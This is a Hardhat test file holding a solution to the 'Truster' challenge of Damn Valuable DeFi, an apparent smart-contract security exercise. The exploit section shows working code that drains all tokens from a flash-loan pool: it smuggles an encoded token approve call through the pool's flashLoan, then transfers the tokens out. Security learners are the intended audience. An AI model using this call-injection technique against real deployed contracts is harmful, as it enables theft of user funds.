const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Truster', function () {
    let deployer, attacker;

    const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const DamnValuableToken = await ethers.getContractFactory('DamnValuableToken', deployer);
        const TrusterLenderPool = await ethers.getContractFactory('TrusterLenderPool', deployer);

        this.token = await DamnValuableToken.deploy();
        this.pool = await TrusterLenderPool.deploy(this.token.address);

        await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal(TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal('0');
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE  */
        // https://ethereum.stackexchange.com/questions/111343/etherjs-equivalent-of-abi-encodewithsignature
        
        let ABI = ["function approve(address spender, uint256 amount)external returns (bool)"];
        let interface = new ethers.utils.Interface(ABI);
        const ourData = interface.encodeFunctionData("approve", [attacker.address, TOKENS_IN_POOL]);
        
        // LE PASAMOS NUESTRA DATA MALICIOSA AL FLASHLOAN
        this.pool.flashLoan(0, attacker.address, this.token.address, ourData);

        // AHORA NOS TRANSFERIMOS LOS TOKENS A NUESTRA CUENTA (attacker)
        await this.token.connect(attacker).transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL);

        console.log("attacker balance", await this.token.balanceOf(attacker.address));
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal(TOKENS_IN_POOL);
        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal('0');
    });
});

